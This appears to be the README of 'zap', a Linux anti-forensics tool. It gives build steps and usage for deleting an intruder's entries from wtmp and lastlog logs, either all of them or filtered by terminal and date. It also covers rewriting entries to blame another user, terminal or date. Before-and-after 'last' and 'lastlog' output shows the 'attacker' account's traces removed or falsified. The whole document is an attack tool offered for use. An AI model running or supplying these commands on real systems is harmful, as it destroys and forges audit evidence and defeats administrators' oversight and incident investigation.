# zap the real
**- zap enhanced -**

## Compile
```$ make```

## Features
### Delete login logs
+ Use `-A` option to delete all your logs.
  + ```./zap -A <username> ```

```
./zap -A attacker
```
```
[ last before ]
attacker pts/10                        Sat Apr 10 18:00    gone - no logout
user     pts/9                         Fri Apr  9 18:00    gone - no logout
attacker pts/8                         Thu Apr  8 18:00    gone - no logout
attacker pts/7                         Wed Apr  7 18:00    gone - no logout
user2    pts/6                         Tue Apr  6 18:00    gone - no logout
attacker pts/5                         Mon Apr  5 18:00    gone - no logout
user     pts/4                         Sun Apr  4 18:00    gone - no logout
user2    pts/3                         Sat Apr  3 18:00    gone - no logout
user     pts/2                         Fri Apr  2 18:00    gone - no logout
user     pts/1                         Thu Apr  1 18:00    gone - no logout

wtmp begins Thu Apr  1 18:00:00 2021
[ lastlog before ]
Username         Port     From             Latest
root                                       **Never logged in**
...
user             pts/9                     Fri Apr  9 18:00:00 +0000 2021
user2            pts/6                     Tue Apr  6 18:00:00 +0000 2021
attacker         pts/10                    Sat Apr 10 18:00:00 +0000 2021
------------------------------------------------------------
[ run ./zap -A attacker ]
Zap!
------------------------------------------------------------
[ last after ]
user     pts/9                         Fri Apr  9 18:00    gone - no logout
user2    pts/6                         Tue Apr  6 18:00    gone - no logout
user     pts/4                         Sun Apr  4 18:00    gone - no logout
user2    pts/3                         Sat Apr  3 18:00    gone - no logout
user     pts/2                         Fri Apr  2 18:00    gone - no logout
user     pts/1                         Thu Apr  1 18:00    gone - no logout

wtmp begins Thu Apr  1 18:00:00 2021
[ lastlog after ]
Username         Port     From             Latest
root                                       **Never logged in**
...
user             pts/9                     Fri Apr  9 18:00:00 +0000 2021
user2            pts/6                     Tue Apr  6 18:00:00 +0000 2021
attacker                                   **Never logged in**
```

### Delete logs with filter
+ Use `-a` option to use filtered log deletion.
+ Use `-t` to specify the terminal(line) name.
+ Use `-d` to specify the date. (format: `mmddyy`)
  + ```./zap -a <username> -t <tty001> -d <mmddyy>```

```
./zap -a attacker -t pts/5 -d 040521
```
```
------------------------------------------------------------
[ last before ]
attacker pts/10                        Sat Apr 10 18:00    gone - no logout
user     pts/9                         Fri Apr  9 18:00    gone - no logout
attacker pts/8                         Thu Apr  8 18:00    gone - no logout
attacker pts/7                         Wed Apr  7 18:00    gone - no logout
user2    pts/6                         Tue Apr  6 18:00    gone - no logout
attacker pts/5                         Mon Apr  5 18:00    gone - no logout
user     pts/4                         Sun Apr  4 18:00    gone - no logout
user2    pts/3                         Sat Apr  3 18:00    gone - no logout
user     pts/2                         Fri Apr  2 18:00    gone - no logout
user     pts/1                         Thu Apr  1 18:00    gone - no logout

wtmp begins Thu Apr  1 18:00:00 2021
[ lastlog before ]
Username         Port     From             Latest
root                                       **Never logged in**
...
user             pts/9                     Fri Apr  9 18:00:00 +0000 2021
user2            pts/6                     Tue Apr  6 18:00:00 +0000 2021
attacker         pts/10                    Sat Apr 10 18:00:00 +0000 2021
------------------------------------------------------------
[ run ./zap -a attacker -t pts/5 -d 040521 ]
Zap!
------------------------------------------------------------
[ last after ]
attacker pts/10                        Sat Apr 10 18:00    gone - no logout
user     pts/9                         Fri Apr  9 18:00    gone - no logout
attacker pts/8                         Thu Apr  8 18:00    gone - no logout
attacker pts/7                         Wed Apr  7 18:00    gone - no logout
user2    pts/6                         Tue Apr  6 18:00    gone - no logout
user     pts/4                         Sun Apr  4 18:00    gone - no logout
user2    pts/3                         Sat Apr  3 18:00    gone - no logout
user     pts/2                         Fri Apr  2 18:00    gone - no logout
user     pts/1                         Thu Apr  1 18:00    gone - no logout

wtmp begins Thu Apr  1 18:00:00 2021
[ lastlog after ]
Username         Port     From             Latest
root                                       **Never logged in**
...
user             pts/9                     Fri Apr  9 18:00:00 +0000 2021
user2            pts/6                     Tue Apr  6 18:00:00 +0000 2021
attacker         pts/10                    Sat Apr 10 18:00:00 +0000 2021
------------------------------------------------------------
```

### Modify your login logs
+ Use `-R` option to modify your login logs.
  + The first parameter will be a target account 
  + The second parameter will be a account name to replace.
+ Use `-t` to specify the terminal(line) name and replace it.
+ Use `-d` to specify the date and replace it. (format: `mmddyy`)
  + ```./zap -a <targetname> <replacename> -t <tty001> <tty002> -d <mmddyy> <mmddyy>```

```
./zap -R attacker user -t pts/10 supertty -d 041021 040221
```
```
------------------------------------------------------------
[ last before ]
attacker pts/10                        Sat Apr 10 18:00    gone - no logout
user     pts/9                         Fri Apr  9 18:00    gone - no logout
attacker pts/8                         Thu Apr  8 18:00    gone - no logout
attacker pts/7                         Wed Apr  7 18:00    gone - no logout
user2    pts/6                         Tue Apr  6 18:00    gone - no logout
attacker pts/5                         Mon Apr  5 18:00    gone - no logout
user     pts/4                         Sun Apr  4 18:00    gone - no logout
user2    pts/3                         Sat Apr  3 18:00    gone - no logout
user     pts/2                         Fri Apr  2 18:00    gone - no logout
user     pts/1                         Thu Apr  1 18:00    gone - no logout

wtmp begins Thu Apr  1 18:00:00 2021
[ lastlog before ]
Username         Port     From             Latest
root                                       **Never logged in**
...
user             pts/9                     Fri Apr  9 18:00:00 +0000 2021
user2            pts/6                     Tue Apr  6 18:00:00 +0000 2021
attacker         pts/10                    Sat Apr 10 18:00:00 +0000 2021
------------------------------------------------------------
[ run ./zap -R attacker user -t pts/10 supertty -d 041021 040221 ]
Zap!
------------------------------------------------------------
[ last after ]
user     pts/9                         Fri Apr  9 18:00    gone - no logout
attacker pts/8                         Thu Apr  8 18:00    gone - no logout
attacker pts/7                         Wed Apr  7 18:00    gone - no logout
user2    pts/6                         Tue Apr  6 18:00    gone - no logout
attacker pts/5                         Mon Apr  5 18:00    gone - no logout
user     pts/4                         Sun Apr  4 18:00    gone - no logout
user2    pts/3                         Sat Apr  3 18:00    gone - no logout
user     supertty                      Fri Apr  2 18:00    gone - no logout
user     pts/2                         Fri Apr  2 18:00    gone - no logout
user     pts/1                         Thu Apr  1 18:00    gone - no logout

wtmp begins Thu Apr  1 18:00:00 2021
[ lastlog after ]
Username         Port     From             Latest
root                                       **Never logged in**
...
user             pts/9                     Fri Apr  9 18:00:00 +0000 2021
user2            pts/6                     Tue Apr  6 18:00:00 +0000 2021
attacker         pts/8                     Thu Apr  8 18:00:00 +0000 2021
```